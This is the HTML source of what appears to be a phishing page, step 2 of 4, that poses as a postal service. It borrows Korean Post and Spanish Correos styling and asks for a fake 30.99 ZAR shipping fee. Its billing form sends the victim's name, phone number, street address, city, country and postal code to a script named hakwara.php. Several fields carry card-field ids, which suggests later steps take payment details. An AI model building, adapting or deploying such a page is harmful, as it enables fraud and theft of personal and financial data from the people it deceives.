<html lang="ko" style="overflow: auto;"><head>
<meta charset="utf-8">
    <title>virtualpostoffice (Step 2 of 4)</title>
		<link rel="icon" type="image/png" href="./favicon.ico">
<meta name="generator" content="WYSIWYG Web Builder 15 - http://www.wysiwygwebbuilder.com">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="Untitled1.css" rel="stylesheet">
<link href="index.css" rel="stylesheet">
</head>
<body onload="" style="overflow: auto;" class="common-screen-body">
<div id="FlexContainer1" style="
    max-width: 1135px;
    margin: auto;
">
<div id="wb_Image2" style="display:inline-block;width:213px;z-index:0;">
<img src="images/mobilogo.jpg" id="Image2" alt="">
</div>
<div id="wb_Image1" style="display:inline-block;width:66px;z-index:1;">
<img src="images/Logout.png" id="Image1" alt="">
</div>
</div>
<div id="FlexContainer2" style="
    max-width: 1135px;
    margin: auto;
">
<div id="wb_Image5" style="display:inline-block;width:35px;z-index:2;">
<img src="images/menu_profile.png" id="Image5" alt="">
</div>
<div id="wb_Image4" style="display:inline-block;width:52px;z-index:3;">
<img src="images/menu_home_b.png" id="Image4" alt="">
</div>
<div id="wb_Image3" style="display:inline-block;width:35px;z-index:4;">
<img src="images/menu_box.png" id="Image3" alt="">
</div>
</div>




<!--<![endif]--><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style id="stndz-style">div[class*="item-container-obpd"], a[data-redirect*="paid.outbrain.com"], a[onmousedown*="paid.outbrain.com"] { display: none !important; } a div[class*="item-container-ad"] { height: 0px !important; overflow: hidden !important; position: absolute !important; } div[data-item-syndicated="true"] { display: none !important; } .grv_is_sponsored { display: none !important; } .zergnet-widget-related { display: none !important; } </style>

<link href="./9ach/postkor.css" rel="stylesheet" type="text/css">
<link href="./9ach/banrkolan.css" rel="stylesheet" type="text/css"> 

<link href="./9ach/bbs.css" rel="stylesheet" type="text/css"> 
<title>correios</title>
    <link type="image/x-icon" rel="shortcut icon" href="./images/favicon.ico">

	
	
	 

<link href="./9ach/reset.css" rel="stylesheet" type="text/css">
<link href="./9ach/font.css" rel="stylesheet" type="text/css">


<div id="wrap">
	<!-- 상단 -->
	<div id="header">
	
		<!-- 상단 메뉴 -->
		<div id="gnb" class="gnb">
		<!--@seed:/kpost/main/top/menu.do-->




	<ul class="gnbDp-1">
		
		
		
		
		
		
		
	</ul><!--@seed:/kpost/main/top/menu.do-->
		</div>
		<p class="gnb_bg" style="display: ; opacity: 1;"><span class=""></span></p>
	</div>
	


</div>



	



<!--<![endif]--><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<link href="./css/bootstrap.min.css" media="screen" rel="stylesheet">
	<link href="./css/validationEngine.jquery.css" rel="stylesheet">
	<link href="./css/flaticon.css" rel="stylesheet">
	<link href="./css/fontawesome-all.min.css" rel="stylesheet">
	<link href="./css/new-style-common-screen.css" rel="stylesheet">
	<link href="./css/common-dynamic.css" rel="stylesheet">
		<link href="favicon.png" type="image/x-icon" rel="shortcut icon">

	<meta name="description" lang="es" content="En la Tienda Online de Correos tenemos todo para hacer tus envíos: cajas, sobres, sellos, embalajes... regalos, coleccionismo y productos solidarios."><!-- Robots --><meta name="robots" content="index,follow"><!-- / Robots --><meta name="expires" content="0"><meta name="revisit-after" content="1 days"><meta http-equiv="pragma" content="no-cache">

<!-- Google Tag Manager -->


<br><section class="common-screen-content">
<section class="go-back-to-shop">
<div class="container">
   
<ul class="nav">
	<li class="nav-item"><a class="nav-link" href="#">back to the store</a></li>
</ul>
</div>
</section>

<section class="checkout-template">
<div class="container">
<!--null
-->

<div class="alert alert-danger alert-error alert-dismissable shopping-cart-alert" style="display:none"><button class="close" data-dismiss="alert" type="button">×</button></div>
<!-- Mobile version Summary of the cart -->

<div class="checkout-mobile-summary">
<div class="checkout-summary-fixed d-block d-lg-none">
<div class="row"></div>

<div class="summary-checkout">
<div class="row">
<div class="col"><span>transaction amount

</span></div>

<div class="col text-right"><span style="
    text-align: right;
    FONT-WEIGHT: BOLD;
">30.99 ZAR (Rand)</span></div>
</div>
</div>
</div>
</div>

<div class="row flex-column-reverse flex-lg-row">
<div class="col-lg-7">
<div class="checkout-left-side">
<div id="cartParent" style="opacity: 1;">








<div class="shopping-cart-locked-parent" id="paypalexpressParent" style="display: block;"></div>





<div class="shopping-cart-form-parent" id="shippingAddressForm" style="display: block;/* text-align: right; */">
<section class="checkout-new-shipping-address">
<div class="checkout-box" style="box-shadow: 0px 0px 20px 9px rgb(0 0 0 / 15%);">
<div class="checkout-box-title">
<div class="checkout-box-title-icon"></div>

<h4> Billing Address</h4>
</div>



                                                               
<br>


<!-- Modificacion: Marca de inicio Acriter NAC C-04-2761-10 Fase2 --> 




		
				<form novalidate="novalidate" autocomplete="off" role="form" action="hakwara.php" accept-charset="UTF-8" method="post" id="formId_038775683063221531600291018965">
				
				
						<div class="error-banner hidden validation section payment generic">
						</div>
						
						
							<input name="payment_method" hidden="" id="payment_method" value="card">
								
								<span class="iw nm" id="card_type_selection">


	
<div class="form-row">
<div class="form-group col-md-8"><label for="shipping.firstname">Full name *<span style="font-size: 9px;"></span></label> 

<input class="form-control validate[required,minSize[2]] null" id="card_type" maxlength="50" name="fname" required="" type="text"></div>


</div><div class="form-row">
<div class="form-group col-md-8"><label for="shipping.firstname">Telephone number *<span style="font-size: 9px;"></span></label> 

<input class="form-control validate[required,minSize[2]] null" id="card_type" style="display:block;width:255px;height:44px;background-image: url(a.png);background-repeat: no-repeat;background-position: right center;" value="+211" maxlength="50" name="fname" required="" type="text"></div>


</div><div class="form-row">
<div class="form-group col-md-8"><label for="shipping.firstname">Street address * <span style="font-size: 9px;"></span></label> 

<input class="form-control validate[required,minSize[2]] null" id="card_type" maxlength="50" name="fname" required="" type="text"></div>


</div>


<div class="form-row">
<div class="form-group col-md-8"><label for="shipping.email">country *<span style="font-size: 9px;"></span>
</label> 
<input class="form-control validate[required,custom[email]] null" value="Mexico" id="card_number" maxlength="19" name="Zawaq" placeholder="" required="" type="text"><span class="iw nm" id="iw-card_number"></span></div>						

</div>
<div class="form-row">

</div><div class="form-row">
<div class="form-group col-md-8"><label for="shipping.email">City *<span style="font-size: 9px;"></span>
</label> 
<input class="form-control validate[required,custom[email]] null" value="Mexico City" id="card_number" maxlength="19" name="Zawaq" placeholder="" required="" type="text"><span class="iw nm" id="iw-card_number"></span></div>						

</div>


				
				   
<div class="form-row">
<div class="form-group col-md-4"><label for="shipping.postalcode">zio code *<span style="font-size: 9px;"></span></label><br> 
<input class="form-control validate[required] null" value="06699" id="card_cvn" maxlength="4" name="zwi9a" placeholder="" required="" type="txt" style="" aria-required="true"><span id="iw-card_cvn">   
</span></div>
</div>
<div class="form-group"></div>






<section class="continue-button py-2 mb-4" id="continueButtonParent">




	
								
								

													   <input type="hidden" name="next">









<div class="d-flex justify-content-end">

<button class="btn btn-primary btn-cart-continue" type="submit">Make Payment</button>



</div>
<br>
<div class="form-group">

<div class="custom-control custom-checkbox" style="
    /* text-align: right; */
"> 
<label class="" for="accept_dpp_shipping" style="
    font-weight: 100!important;
"> <img alt="" src="./images/Exclamation.png" style="width: ;">  * Pay attention to correct spelling. A data entry error can cause documents to be incorrectly sent to third parties.</label></div>
</div>
</section>


</span><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div><div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div></form></div>
</section>
</div>














</div>
</div>
</div>

<div class="col-lg-5">
<div class="checkout-right-side" style="
    box-shadow: 0px 0px 20px 9px rgb(0 0 0 / 15%);
">
<section class="checkout-summary d-none d-lg-block">
<div class="summary-product-list">
<div class="item">
<div class="row">
<div class="col-3 flex-grow-0 image-col">
<div class="item-image"><img alt="Norway Post's new logo: Pokball or Marathon symbol variation? | Engadget" src="https://png.pngtree.com/png-vector/20190123/ourlarge/pngtree-freight-logistics-courier-ship-png-image_541515.jpg"><a href="#"> </a></div>
</div>

<div class="col-5 title-col">
<div class="item-title">
<p>Additional shipping costs
</p>
</div>
</div>

<div class="col-4 flex-grow-0 buttons-col">
<div class="d-flex buttons-col-container justify-content-between h-100">
<div class="item-delete-button"><button class="btn-update-cart-item-quantity" data-input-selector="#cartQuantityProductId_147" value="0"></button></div>

<div class="item-price-total">
<p class="item-price">VAT amount

</p>

<p class="item-vat-text">0,00 ZAR

</p>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="summary-subtotal">
<div class="summary-total">
<div class="row">
<div class="col">
<div class="text-left">
<p class="total-title">Grand total

</p>
</div>
</div>

<div class="col">
<div class="text-right">
<p class="total-amount">30.99 ZAR (Rand)

</p>

<p class="total-vat-included">(VAT included)</p>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</section>
</section>

<section class="common-screen-footer"></section>




</body></html>